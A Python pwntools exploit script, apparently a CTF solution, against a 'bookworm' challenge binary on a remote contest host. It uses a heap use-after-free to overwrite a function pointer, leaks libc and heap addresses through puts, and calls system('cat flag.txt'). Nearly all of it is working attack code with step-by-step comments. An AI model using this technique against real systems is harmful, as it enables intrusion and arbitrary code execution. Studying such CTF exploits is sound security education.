#!/usr/bin/python3

from pwn import *

target = './bookworm'

#context.log_level = 'error'
context.update(terminal = ['tmux','splitw'])

#==========================================================
#           FUNCTIONS
#==========================================================

def insert_book(s1,name,s2,summary):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(s1)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('size:')
    p.sendline(s2)
    p.recvuntil('summary:')
    p.sendline(summary)

def delete_book(bookid):
    p.recvuntil('>>')
    p.sendline('2')
    p.sendline(bookid)

def write_sum(bookid,s1,summary):
    p.recvuntil('>>')
    p.sendline('3')
    p.sendline(bookid)
    p.sendline(s1)
    p.sendline(summary)

def call_fun(bookid):
    p.recvuntil('>>')
    p.sendline('4')
    p.sendline(bookid)

#==========================================================
#           CODE
#==========================================================

#p = process(target, env={"LD_PRELOAD":"./home/helpful/git/ctf_writeups/bookworm/libc.so.6"})
p = remote('cha.hackpack.club',41720)

#gdb.attach(p)

pl1 = p64(0x400700)      #puts call (thunk)
pl1 += p64(0x41414141)   #padding
pl1 += p64(0x602020)     #puts @got.plt

insert_book('23','cat flag.txt','23','CCCCCCCCDDDDDDDD')    # first book will also hold our cat flag.txt command for our system call
delete_book('0')                                            # free the book
insert_book('24','AAAABBBB', '23', 'GGGGGGGGHHHHHHHH')      # make new book and ensure the summary is shorter than 24 and the name is longer.  this causes the summary to be written where book 0s function calls were

write_sum('1','24',pl1)                                     # makes book 0s call a puts to the puts location on the plt
call_fun('0')

puts_leak = p.recvline()                                    # saves the leaked libc address for puts
puts_leak = puts_leak.split(b': ')[1].rstrip(b'\n')
sys_addr = int.from_bytes(puts_leak, byteorder='little')
sys_addr = sys_addr - 202112                                # calculates system address based on the difference between system and puts in the libc.so.6 binary


pl2 = p64(0x400700)                                         # second payload to leak the heap address of the first book name "cat flag.txt" 
pl2 += p64(0x42424242)
pl2 += p64(0x6020c0)

write_sum('1','24', pl2)
call_fun('0')

ptr_leak = p.recvline()
ptr_leak = ptr_leak.split(b': ')[1].rstrip(b'\n')
ptr_leak = int.from_bytes(ptr_leak, byteorder='little')


pl3 = p64(sys_addr)                                         # third payload uses both leaked addresses to call system with a ptr to the heap address of "cat flag.txt"
pl3 += p64(0x43434343)
pl3 += p64(ptr_leak - 0x40) 
        
write_sum('1','24',pl3)
call_fun('0')

print(p.recvline().split(b': ')[1].rstrip(b'\n'))

p.close()

